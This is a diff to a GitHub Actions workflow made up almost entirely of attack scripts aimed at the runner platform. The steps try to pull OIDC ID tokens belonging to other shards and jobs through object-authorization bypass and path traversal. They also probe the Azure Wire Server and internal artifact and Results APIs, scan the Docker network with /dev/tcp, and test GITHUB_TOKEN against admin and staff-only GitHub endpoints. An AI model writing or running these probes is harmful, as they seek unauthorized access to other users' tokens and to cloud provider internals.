@@ -8,67 +8,93 @@ jobs:
   inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure Wire Server (168.63.129.16) - undocumented endpoints
+      - name: OIDC BOLA - cross-shard and cross-job token access
+        continue-on-error: true
         run: |
-          WIRE=168.63.129.16
-          echo "=== WIRE SERVER PROBING ==="
-          # Known Azure Wire Server endpoints
-          for path in "/" "/machine?comp=goalstate" "/machine?comp=health" \
-              "/machine?comp=roleEnvironment" "/machine?comp=extensions" \
-              "/?comp=acls" "/?comp=acls&type=tunneledpacket" \
-              "/metadata/instance" "/metadata/identity" \
-              "/hostgaservice" "/hostgaservice/health" \
-              "/$system/thread" "/WireServer" "/health" \
-              "/machine" "/acls" "/packages" "/versions"; do
-            HTTP=$(curl -s --max-time 4 -o /tmp/wire_resp.txt -w "%{http_code}" \
-              "http://$WIRE$path" 2>/dev/null)
-            SIZE=$(wc -c < /tmp/wire_resp.txt 2>/dev/null || echo 0)
-            if [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
-              echo "  [$HTTP] $SIZE bytes -> http://$WIRE$path"
-              if [ "$HTTP" = "200" ] && [ "$SIZE" -lt 500 ]; then
-                cat /tmp/wire_resp.txt
-                echo ""
-              fi
-            fi
-          done
-
-      - name: OIDC shard BOLA - cross-run token access
-        run: |
-          echo "=== OWN OIDC URL SHARD ==="
+          echo "=== OWN URL ==="
           echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
           BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
-          SHARD=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '(?<=\.com/)\d+')
-          echo "Shard: $SHARD"
+          SHARD=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '/\d+//')
+          PLAN=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '[0-9a-f-]{36}' | head -1)
+          JOB=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '[0-9a-f-]{36}' | tail -1)
+          echo "Base: $BASE, Shard: $SHARD, Plan: $PLAN, Job: $JOB"
           echo ""
-          echo "=== TRY OTHER SHARDS (BOLA) ==="
-          for s in 0 1 2 3 4 5 10 22 50 77 100; do
-            URL="${BASE}/${s}//idtoken/00000000-0000-0000-0000-000000000000/00000000-0000-0000-0000-000000000000?api-version=2.0"
-            HTTP=$(curl -sf --max-time 4 \
+
+          echo "=== TEST 1: Different shard (cross-shard BOLA) ==="
+          for shard in 0 1 5 10 22 50; do
+            URL="${BASE}/${shard}//idtoken/${PLAN}/${JOB}?api-version=2.0"
+            HTTP=$(curl -s --max-time 5 \
               -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "$URL&audience=sigstore" -o /dev/null -w "%{http_code}" 2>/dev/null)
-            echo "  shard $s -> HTTP $HTTP"
+              "$URL&audience=sigstore" -o /tmp/bola.json -w "%{http_code}")
+            echo "  Shard $shard -> HTTP $HTTP $(cat /tmp/bola.json 2>/dev/null | head -c 60)"
           done
 
-      - name: Results API - artifact backend probe
+          echo ""
+          echo "=== TEST 2: Same shard, different UUIDs (non-existent job) ==="
+          FAKE_UUID="00000000-0000-0000-0000-000000000000"
+          URL="${BASE}${SHARD}idtoken/${FAKE_UUID}/${FAKE_UUID}?api-version=2.0"
+          HTTP=$(curl -s --max-time 5 \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$URL&audience=sigstore" -o /tmp/bola2.json -w "%{http_code}")
+          echo "  Fake UUIDs -> HTTP $HTTP $(cat /tmp/bola2.json | head -c 80)"
+
+          echo ""
+          echo "=== TEST 3: Double-slash path traversal ==="
+          # Try ../1//idtoken to cross shards via traversal
+          for s in 0 1 22; do
+            URL="${BASE}${SHARD}../../../${s}//idtoken/${PLAN}/${JOB}?api-version=2.0"
+            HTTP=$(curl -s --max-time 5 \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$URL&audience=sigstore" -o /dev/null -w "%{http_code}")
+            echo "  Traversal to shard $s -> HTTP $HTTP"
+          done
+
+      - name: Artifact Results API direct probe
+        continue-on-error: true
         run: |
-          echo "=== RESULTS API ENDPOINTS ==="
-          for host in "results.actions.githubusercontent.com" \
-              "artifactcache.actions.githubusercontent.com" \
-              "pipelines.actions.githubusercontent.com"; do
-            for path in "/" "/health" "/_ping" "/twirp/" \
-                "/twirp/github.actions.results.api.v1.ArtifactService/"; do
-              HTTP=$(curl -sf --max-time 5 "https://$host$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
-              [ "$HTTP" != "000" ] && echo "  $host$path -> $HTTP"
+          echo "=== RESULTS API STRUCTURE ==="
+          for host in results.actions.githubusercontent.com \
+              artifactcache.actions.githubusercontent.com \
+              uploads.github.com; do
+            for path in / /health /_ping /metrics /twirp \
+                /twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts \
+                /twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact; do
+              HTTP=$(curl -s --max-time 4 \
+                "https://$host$path" -o /dev/null -w "%{http_code}" 2>/dev/null)
+              [ "$HTTP" != "000" ] && echo "  https://$host$path -> $HTTP"
             done
           done
 
-      - name: Docker network SSRF
+      - name: GitHub token scope probing - can GITHUB_TOKEN access private APIs?
+        continue-on-error: true
         run: |
-          echo "=== DOCKER NETWORK SCAN ==="
-          for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.18.0.1; do
-            for port in 80 443 2375 2376 8080 5000; do
-              OK=$(timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN")
-              [ -n "$OK" ] && echo "  $ip:$port OPEN"
-            done
+          echo "=== GITHUB_TOKEN PRIVATE API ACCESS ==="
+          # Test if GITHUB_TOKEN can access normally-restricted endpoints
+          for ep in \
+            "https://api.github.com/enterprises" \
+            "https://api.github.com/admin/users" \
+            "https://api.github.com/stafftools/users/dannyggg3" \
+            "https://api.github.com/site_admin/users" \
+            "https://github.com/_private/browser/stats" \
+            "https://api.github.com/internal/github-apps"; do
+            HTTP=$(curl -s --max-time 5 \
+              -H "Authorization: bearer $GITHUB_TOKEN" \
+              "$ep" -o /dev/null -w "%{http_code}" 2>/dev/null)
+            echo "  $ep -> HTTP $HTTP"
           done
-          echo "(done)"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Wire server - minimal test with 2s timeout
+        continue-on-error: true  
+        run: |
+          echo "=== WIRE SERVER MINIMAL ==="
+          for path in "/machine?comp=goalstate" "/machine?comp=health"; do
+            HTTP=$(curl -s --max-time 2 \
+              "http://168.63.129.16$path" \
+              -o /tmp/wire.txt -w "%{http_code}" 2>/dev/null || echo "TIMEOUT")
+            echo "  $path -> $HTTP ($(wc -c < /tmp/wire.txt 2>/dev/null) bytes)"
+          done
+          echo "=== DNS via wire server ==="
+          curl -s --max-time 2 "http://168.63.129.16/" -o /tmp/wire_root.txt -w "Root: %{http_code}\n"
+          head -5 /tmp/wire_root.txt 2>/dev/null
